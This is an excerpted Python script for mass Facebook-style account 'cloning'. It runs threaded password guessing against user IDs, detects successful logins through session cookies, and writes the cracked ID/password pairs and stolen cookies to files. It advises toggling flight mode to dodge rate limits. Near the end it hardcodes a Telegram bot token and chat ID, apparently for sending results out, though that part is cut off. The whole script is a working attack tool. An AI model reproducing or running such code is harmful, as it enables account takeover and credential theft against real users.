#_Follow__My__Github____ https://github.com/princeshahin
import os
import sys
import time
import requests
...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mRONY')
...
def menu():
	...
	print ("[2] RANDOM CLONEING")
	print ("[3] GMAIL CLONING")
	print ("[0] EXIT")
	print (50*"-")
	ot = input('[=] Choose option >>> ')
	if ot == '1':
		crack_file()
	if ot == '2':
		rndm()
...
def rndm():
	...
	if len(cod) != 4:
		...
		pass
	clear()
	print("[=] Example : [1000]-[5000]-[20000]-[50000]")
	...
	csp = input('[=] ENTER YES OR NO : ')
	
	sai = []
	if csp in ['y','Y','yes','Yes','1']:
		psx = int(input("[?] Enter Password Limit: "))
		for sa in range(psx):
			pww = input(f"[√] Enter Password: ")
			sai.append(pww)
	else:
		pass
	with ThreadPool(max_workers=30) as POWER:
		clear()
		ln = str(len(user))
		print(50*'-')
		print('[=] TOTAL IDS: '+ln)
...
def mail():
	user=[]
	clear()
	print('[=] Exmaple : sagor masum siyam')
	first = input('[=] Email FARST NAME: ')
	print('[=] Exmaole : ahmed choudury Hisen')
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;37m[%sPOWER\033[1;37m]>=<[\033[1;32m%s\033[1;37m/\033[1;32m%s\033[1;37m]>=<[\033[1;32mOK-%s\033[1;37m]>=<[\033[1;31mCP-%s\033[1;37m] \r'%(wa,loop,ln,len(oks),len(cps)));
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
            	...
            	cid = coki[65:80]
            	print('\033[1;93mRONY-OK ' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;97mCOOKIES : \033[1;92m'+coki+ '')
            	open('RONY-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('RONY-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\033[1;30mCP '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
...
def passwrd():
	clear()
	print("[=] USE MOBILE DATA\033[1;37m")
	print("[=] TOTAL IDz : "+str(len(id)))
	print("[=] TURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	sawrojj(f'-----------------------------------------------')
	with ThreadPool(max_workers=30) as POWER:
		for yuzong in id2:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {POWER} {P}{loop}{P}>=<{P}{len(id)}>=<OK={ok} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r {RONY-OK} {idf} • {pw}')
				open('RONY=/sdcard/OK/'+okc,'a').write(idf+' '+pw+'\n')
				cek_apk(session,coki)
				break
...
def engine():
    session=requests.session()
    bot_token = '6860089486:AAGcSn5nZ8iqSajl6355oS7SGt3kdUnTQa4' 
    chat_id = '6567059866'
    try:
